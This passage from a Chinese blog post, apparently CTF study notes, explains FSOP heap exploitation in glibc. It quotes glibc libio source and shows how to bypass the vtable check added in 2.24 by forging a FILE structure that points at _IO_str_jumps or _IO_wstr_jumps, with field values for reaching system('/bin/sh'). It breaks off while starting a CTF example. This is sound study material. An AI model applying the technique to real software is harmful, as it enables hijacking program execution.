title="FSOP（libc版本&lt;2.24)"></a>FSOP（libc版本&lt;2.24)</h3><p>利用任意地址写来覆盖_IO_list_all让链表指向我们能控制的区域，从而改写虚表vtable<br>然后通过调用_IO_flush_all_lockup()来触发漏洞</p><p>该函数的调用条件：</p><ol><li>当 libc 执行 abort 流程时。</li><li>执行 exit 函数时，当执行流从 main 函数返回时</li><li>当执行流从 main 函数返回时</li></ol><p>而当glibc检测到内存错误时，会依次调用这样的函数路径：malloc_printerr -&gt;<br>libc_message-&gt;__GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</p><p>如果我们需要控制执行流，我们就得伪造 fp-&gt;_mode &#x3D; 0， fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base来通过验证</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">if</span> (((fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">mode</span> &lt;= 0 &amp;&amp; fp-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> &gt; fp-&gt;</span>_IO_write_base)   <br>#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T<br>       || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>           &amp;&amp; <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">mode</span> &gt; 0 &amp;&amp; (fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_ptr<br>                    &gt; <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base))<br>#endif<br>       )<br>      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br></code></pre></td></tr></table></figure><h3 id="libc版本-2-24"><a href="#libc版本-2-24" class="headerlink" title="libc版本&gt;2.24"></a>libc版本&gt;2.24</h3><p>由于libc-2.24版本新增了检查机制,而新增的两个函数IO_validate_vtable 和 _IO_vtable_check的代码如下：</p><ol><li>IO_validate_vtable</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// libio/libioP.h</span><br><br><span class="hljs-comment">/* Perform vtable pointer validation.  If validation fails, terminate</span><br><span class="hljs-comment">   the process.  */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_IO_jump_t</span> *<br><span class="hljs-built_in">IO_validate_vtable</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)<br>&#123;<br>  <span class="hljs-comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span><br><span class="hljs-comment">     section.  */</span><br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ptr = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))<br>    <span class="hljs-comment">/* The vtable pointer is not in the expected section.  Use the</span><br><span class="hljs-comment">       slow path, which will terminate the process if necessary.  */</span><br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>_IO_vtable_check</li></ol><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">// libio/vtables.c</span><br><br><span class="hljs-type">void</span> attribute_hidden<br>_IO_vtable_check (<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  <span class="hljs-comment">/* Honor the compatibility flag.  */</span><br>  <span class="hljs-type">void</span> (*flag) (<span class="hljs-type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (flag);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (flag == &amp;_IO_vtable_check)<br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">/* In case this libc copy is in a non-default namespace, we always</span><br><span class="hljs-comment">     need to accept foreign vtables because there is always a</span><br><span class="hljs-comment">     possibility that FILE * objects are passed across the linking</span><br><span class="hljs-comment">     boundary.  */</span><br>  &#123;<br>    Dl_info di;<br>    <span class="hljs-keyword">struct</span> link_map *l;<br>    <span class="hljs-keyword">if</span> (_dl_open_hook != <span class="hljs-literal">NULL</span><br>        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span><br>            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))<br>      <span class="hljs-keyword">return</span>;<br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span> <span class="hljs-comment">/* !SHARED */</span></span><br>  <span class="hljs-comment">/* We cannot perform vtable validation in the static dlopen case</span><br><span class="hljs-comment">     because FILE * handles might be passed back and forth across the</span><br><span class="hljs-comment">     boundary.  Therefore, we disable checking in this case.  */</span><br>  <span class="hljs-keyword">if</span> (__dlopen != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  __libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个新增的防御机制会检查边界，从而使得我们一旦将vtable指向堆地址就会报错甚至退出程序</p><p>但是道高一尺魔高一丈，我们可以不转移地址，而是在vtable选择一个能完成我们任务的东西：</p><h4 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="IO_str_jumps"></a>IO_str_jumps</h4><p>虽然不能把vtable改到堆上了,但是我们依旧可以改 vtable为 _IO_str_jump来绕过检测<br>因为其中使用的IO_str_overflow 函数会调用 FILE+0xe0处的地址。这时只要我们将虚表覆盖为 IO_str_jumps将偏移0xe0处设置为one_gadget即可。</p><p>代码如下:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-comment">// libio/strops.c</span><br><br>const struct <span class="hljs-variable">_IO_jump_t</span> <span class="hljs-variable">_IO_str_jumps</span> libio_vtable =<br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, <span class="hljs-variable">_IO_str_finish</span>),<br>  JUMP_INIT(overflow, <span class="hljs-variable">_IO_str_overflow</span>),<br>  JUMP_INIT(underflow, <span class="hljs-variable">_IO_str_underflow</span>),<br>  JUMP_INIT(uflow, <span class="hljs-variable">_IO_default_uflow</span>),<br>  JUMP_INIT(pbackfail, <span class="hljs-variable">_IO_str_pbackfail</span>),<br>  JUMP_INIT(xsputn, <span class="hljs-variable">_IO_default_xsputn</span>),<br>  JUMP_INIT(xsgetn, <span class="hljs-variable">_IO_default_xsgetn</span>),<br>  JUMP_INIT(seekoff, <span class="hljs-variable">_IO_str_seekoff</span>),<br>  JUMP_INIT(seekpos, <span class="hljs-variable">_IO_default_seekpos</span>),<br>  JUMP_INIT(setbuf, <span class="hljs-variable">_IO_default_setbuf</span>),<br>  JUMP_INIT(sync, <span class="hljs-variable">_IO_default_sync</span>),<br>  JUMP_INIT(doallocate, <span class="hljs-variable">_IO_default_doallocate</span>),<br>  JUMP_INIT(read, <span class="hljs-variable">_IO_default_read</span>),<br>  JUMP_INIT(write, <span class="hljs-variable">_IO_default_write</span>),<br>  JUMP_INIT(seek, <span class="hljs-variable">_IO_default_seek</span>),<br>  JUMP_INIT(close, <span class="hljs-variable">_IO_default_close</span>),<br>  JUMP_INIT(stat, <span class="hljs-variable">_IO_default_stat</span>),<br>  JUMP_INIT(showmanyc, <span class="hljs-variable">_IO_default_showmanyc</span>),<br>  JUMP_INIT(imbue, <span class="hljs-variable">_IO_default_imbue</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">// libio/libioP.h</span><br><br><span class="hljs-selector-id">#define</span> JUMP_INIT_DUMMY <span class="hljs-built_in">JUMP_INIT</span>(dummy, <span class="hljs-number">0</span>), JUMP_INIT (dummy2, <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p><strong>而这个vtable中包含了函数_IO_str_overflow,这个函数有相对地址引用,也就是可以伪造引用的地址</strong></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs xl">int<br>_IO_str_overflow (_IO_FILE *fp, int c)<br>&#123;<br>  int flush_only = c == EOF;<br>  _IO_size_t pos;<br>  <span class="hljs-function"><span class="hljs-title">if</span> (fp-&gt;</span>_flags &amp; _IO_NO_WRITES)<br>      return flush_only ? <span class="hljs-number">0</span> : EOF;<br>  <span class="hljs-function"><span class="hljs-title">if</span> ((fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">flags</span> &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;</span>_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_flags |= _IO_CURRENTLY_PUTTING;<br>      <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> = fp-&gt;</span>_IO_read_ptr;<br>      <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">read_ptr</span> = fp-&gt;</span>_IO_read_end;<br>    &#125;<br>  <span class="hljs-function"><span class="hljs-title">pos</span> = fp-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> - fp-&gt;</span>_IO_write_base;<br>  <span class="hljs-function"><span class="hljs-title">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))                       // 条件 #define _IO_blen(fp) ((fp)-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">buf_end</span> - (fp)-&gt;</span>_IO_buf_base)<br>    &#123;<br>      <span class="hljs-function"><span class="hljs-title">if</span> (fp-&gt;</span>_flags &amp; _IO_USER_BUF) <span class="hljs-comment">/* not allowed to enlarge */</span><br>    return EOF;<br>      <span class="hljs-keyword">else</span><br>    &#123;<br>      char *new_buf;<br>      <span class="hljs-function"><span class="hljs-title">char</span> *old_buf = fp-&gt;</span>_IO_buf_base;<br>      size_t old_blen = _IO_blen (fp);<br>      _IO_size_t new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;                                 <span class="hljs-comment">// 通过计算 new_size 为 &quot;/bin/sh\x00&quot; 的地址</span><br>      <span class="hljs-keyword">if</span> (new_size &lt; old_blen)<br>        return EOF;<br>      new_buf<br>        = (<span class="hljs-function"><span class="hljs-title">char</span> *) (*((_IO_strfile *) fp)-&gt;</span>_s._allocate_buffer) (new_size);     <span class="hljs-comment">// 在这个相对地址放上 system 的地址，即 system(&quot;/bin/sh&quot;)</span><br></code></pre></td></tr></table></figure><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-comment">// libio/strfile.h</span><br><br>struct <span class="hljs-variable">_IO_str_fields</span><br>&#123;<br>  <span class="hljs-variable">_IO_alloc_type</span> <span class="hljs-variable">_allocate_buffer</span>;<br>  <span class="hljs-variable">_IO_free_type</span> <span class="hljs-variable">_free_buffer</span>;<br>&#125;;<br><br>struct <span class="hljs-variable">_IO_streambuf</span><br>&#123;<br>  struct <span class="hljs-variable">_IO_FILE</span> <span class="hljs-variable">_f</span>;<br>  const struct <span class="hljs-variable">_IO_jump_t</span> *vtable;<br>&#125;;<br><br>typedef struct <span class="hljs-variable">_IO_strfile_</span><br>&#123;<br>  struct <span class="hljs-variable">_IO_streambuf</span> <span class="hljs-variable">_sbf</span>;<br>  struct <span class="hljs-variable">_IO_str_fields</span> <span class="hljs-variable">_s</span>;<br>&#125; <span class="hljs-variable">_IO_strfile</span>;<br></code></pre></td></tr></table></figure><p>因此,伪造方式如下:</p><h5 id="伪造方式"><a href="#伪造方式" class="headerlink" title="伪造方式"></a>伪造方式</h5><ul><li>fp-&gt;_flags &#x3D; 0</li><li>fp-&gt;_IO_buf_base &#x3D; 0</li><li>fp-&gt;_IO_buf_end &#x3D; (bin_sh_addr - 100) &#x2F; 2#如果bin&#x2F;sh地址以奇数结尾可以+1以避免向下取整</li><li>fp-&gt;_IO_write_ptr &#x3D; 0xffffffff</li><li>fp-&gt;_IO_write_base &#x3D; 0</li><li>fp-&gt;_mode &#x3D; 0</li></ul><h5 id="完整的调用过程如下"><a href="#完整的调用过程如下" class="headerlink" title="完整的调用过程如下:"></a>完整的调用过程如下:</h5><p><strong>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI__IO_str_overflow</strong><br>但是我们不需要知道heap的地址,因为vtable位于LIBC,故只要libc地址已知即可</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sqf">void<br><span class="hljs-variable">_IO_str_finish</span> (<span class="hljs-variable">_IO_FILE</span> *fp, int dummy)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;<span class="hljs-variable">_IO_buf_base</span> &amp;&amp; !(fp-&gt;<span class="hljs-variable">_flags</span> &amp; <span class="hljs-variable">_IO_USER_BUF</span>))             <span class="hljs-comment">// 条件</span><br>    (((<span class="hljs-variable">_IO_strfile</span> *) fp)-&gt;<span class="hljs-variable">_s</span>.<span class="hljs-variable">_free_buffer</span>) (fp-&gt;<span class="hljs-variable">_IO_buf_base</span>);     <span class="hljs-comment">// 在这个相对地址放上 system 的地址</span><br>  fp-&gt;<span class="hljs-variable">_IO_buf_base</span> = NULL;<br><br>  <span class="hljs-variable">_IO_default_finish</span> (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个利用我们只要在 fp-&gt;_IO_buf_base 放上 “&#x2F;bin&#x2F;sh” 的地址，然后设置 fp-&gt;_flags &#x3D; 0 就可以绕过函数要去里的条件。</p><h5 id="那么进入函数的方法"><a href="#那么进入函数的方法" class="headerlink" title="那么进入函数的方法:"></a>那么进入函数的方法:</h5><ol><li>fclose(fp)可以让程序进入_IO_str_finish执行</li><li>异常处理,我们伪造传递给 _IO_OVERFLOW(fp) 的 fp 是 vtable 的地址减去 0x8，那么根据偏移，程序将找到 _IO_str_finish 并执行</li></ol><hr><p>这里还有一个函数可以用:</p><h4 id="IO-wstr-jumps"><a href="#IO-wstr-jumps" class="headerlink" title="_IO_wstr_jumps"></a><strong>_IO_wstr_jumps</strong></h4><p>可以用IO_finish,o_finish会以 IO_buf_base处的值为参数跳转至 FILE+0xe8处的地址然后执行 fclose（ fp）时会调用此函数，但是大多数情况下可能不会有 fclose（fp），这时我们还是可以利用异常来调用 io_finish，异常时调用 IO_OVERFLOW是根据IO_str_overflow在虚表中的偏移找到的， 我们可以设置vtable为IO_str_jumps-0x8异常时会调用io_finish函数。</p><p>代码如下:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-comment">// libio/wstrops.c</span><br><br>const struct <span class="hljs-variable">_IO_jump_t</span> <span class="hljs-variable">_IO_wstr_jumps</span> libio_vtable =<br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, <span class="hljs-variable">_IO_wstr_finish</span>),<br>  JUMP_INIT(overflow, (<span class="hljs-variable">_IO_overflow_t</span>) <span class="hljs-variable">_IO_wstr_overflow</span>),<br>  JUMP_INIT(underflow, (<span class="hljs-variable">_IO_underflow_t</span>) <span class="hljs-variable">_IO_wstr_underflow</span>),<br>  JUMP_INIT(uflow, (<span class="hljs-variable">_IO_underflow_t</span>) <span class="hljs-variable">_IO_wdefault_uflow</span>),<br>  JUMP_INIT(pbackfail, (<span class="hljs-variable">_IO_pbackfail_t</span>) <span class="hljs-variable">_IO_wstr_pbackfail</span>),<br>  JUMP_INIT(xsputn, <span class="hljs-variable">_IO_wdefault_xsputn</span>),<br>  JUMP_INIT(xsgetn, <span class="hljs-variable">_IO_wdefault_xsgetn</span>),<br>  JUMP_INIT(seekoff, <span class="hljs-variable">_IO_wstr_seekoff</span>),<br>  JUMP_INIT(seekpos, <span class="hljs-variable">_IO_default_seekpos</span>),<br>  JUMP_INIT(setbuf, <span class="hljs-variable">_IO_default_setbuf</span>),<br>  JUMP_INIT(sync, <span class="hljs-variable">_IO_default_sync</span>),<br>  JUMP_INIT(doallocate, <span class="hljs-variable">_IO_wdefault_doallocate</span>),<br>  JUMP_INIT(read, <span class="hljs-variable">_IO_default_read</span>),<br>  JUMP_INIT(write, <span class="hljs-variable">_IO_default_write</span>),<br>  JUMP_INIT(seek, <span class="hljs-variable">_IO_default_seek</span>),<br>  JUMP_INIT(close, <span class="hljs-variable">_IO_default_close</span>),<br>  JUMP_INIT(stat, <span class="hljs-variable">_IO_default_stat</span>),<br>  JUMP_INIT(showmanyc, <span class="hljs-variable">_IO_default_showmanyc</span>),<br>  JUMP_INIT(imbue, <span class="hljs-variable">_IO_default_imbue</span>)<br>&#125;;<br></code></pre></td></tr></table></figure><p>这个利用了函数_IO_wstr_overflow,代码如下:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs xl">_IO_wint_t<br>_IO_wstr_overflow (_IO_FILE *fp, _IO_wint_t c)<br>&#123;<br>  int flush_only = c == WEOF;<br>  _IO_size_t pos;<br>  <span class="hljs-function"><span class="hljs-title">if</span> (fp-&gt;</span>_flags &amp; _IO_NO_WRITES)<br>      return flush_only ? <span class="hljs-number">0</span> : WEOF;<br>  <span class="hljs-function"><span class="hljs-title">if</span> ((fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">flags</span> &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;</span>_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_flags |= _IO_CURRENTLY_PUTTING;<br>      <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> = fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_read_ptr;<br>      <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">read_ptr</span> = fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_read_end;<br>    &#125;<br>  <span class="hljs-function"><span class="hljs-title">pos</span> = fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> - fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base;<br>  <span class="hljs-function"><span class="hljs-title">if</span> (pos &gt;= (_IO_size_t) (_IO_wblen (fp) + flush_only))    // 条件 #define _IO_wblen(fp) ((fp)-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">buf_end</span> - (fp)-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_buf_base)<br>    &#123;<br>      <span class="hljs-function"><span class="hljs-title">if</span> (fp-&gt;</span>_flags2 &amp; _IO_FLAGS2_USER_WBUF) <span class="hljs-comment">/* not allowed to enlarge */</span><br>    return WEOF;<br>      <span class="hljs-keyword">else</span><br>    &#123;<br>      wchar_t *new_buf;<br>      <span class="hljs-function"><span class="hljs-title">wchar_t</span> *old_buf = fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_buf_base;<br>      size_t old_wblen = _IO_wblen (fp);<br>      _IO_size_t new_size = <span class="hljs-number">2</span> * old_wblen + <span class="hljs-number">100</span>;              <span class="hljs-comment">// 使 new_size * sizeof(wchar_t) 为 &quot;/bin/sh&quot; 的地址</span><br><br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (new_size &lt; old_wblen)<br>          || __glibc_unlikely (new_size &gt; SIZE_MAX / sizeof (wchar_t)))<br>        return EOF;<br><br>      new_buf<br>        = (<span class="hljs-function"><span class="hljs-title">wchar_t</span> *) (*((_IO_strfile *) fp)-&gt;</span>_s._allocate_buffer) (new_size<br>                                    * sizeof (wchar_t));                      <span class="hljs-comment">// 在这个相对地址放上 system 的地址</span><br></code></pre></td></tr></table></figure><p>利用函数_IO_wstr_finish,代码如下:</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xl">void<br>_IO_wstr_finish (_IO_FILE *fp, int dummy)<br>&#123;<br>  <span class="hljs-function"><span class="hljs-title">if</span> (fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">buf_base</span> &amp;&amp; !(fp-&gt;</span>_flags2 &amp; _IO_FLAGS2_USER_WBUF))    <span class="hljs-comment">// 条件</span><br>    (((_IO_<span class="hljs-function"><span class="hljs-title">strfile</span> *) fp)-&gt;</span>_<span class="hljs-function"><span class="hljs-title">s</span>._free_buffer) (fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_buf_base);     <span class="hljs-comment">// 在这个相对地址放上 system 的地址</span><br>  <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_buf_base = NULL;<br><br>  _IO_wdefault_finish (fp, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><h2 id="libc-2-23版本"><a href="#libc-2-23版本" class="headerlink" title="libc-2.23版本"></a>libc-2.23版本</h2><h3 id="HITB-XCTF-2018-GSEC-once"><a href="#HITB-XCTF-2018-GSEC-once" class="headerlink" title="HITB-XCTF 2018 GSEC once"></a>HITB-XCTF 2018 GSEC once</h3><p>libc版本有点低,先咕咕咕了</p><h2 id="libc未知版本-无leak"><a href="#libc未知版本-无leak" class="headerlink" title="libc未知版本(无leak)"></a>libc未知版本(无leak)</h2><h3 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h3><p><a href="https://github.com/breakingdevil/2018wdb_questions/blob/master/blind.zip?raw=true">题目链接</a></p><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><h5 id="main函数-我给函数都起了别名"><a href="#main函数-我给函数都起了别名" class="headerlink" title="main函数(我给函数都起了别名)"></a>main函数(我给函数都起了别名)</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs awk">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)<br>&#123;<br>  int v3; <span class="hljs-regexp">//</span> [rsp+Ch] [rbp-<span class="hljs-number">24</span>h]<br>  char s; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">10</span>h] [rbp-<span class="hljs-number">20</span>h]<br>  unsigned __int64 v5; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">28</span>h] [rbp-<span class="hljs-number">8</span>h]<br><br>  v5 = __readfsqword(<span class="hljs-number">0</span>x28u);<br>  sub_400882();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    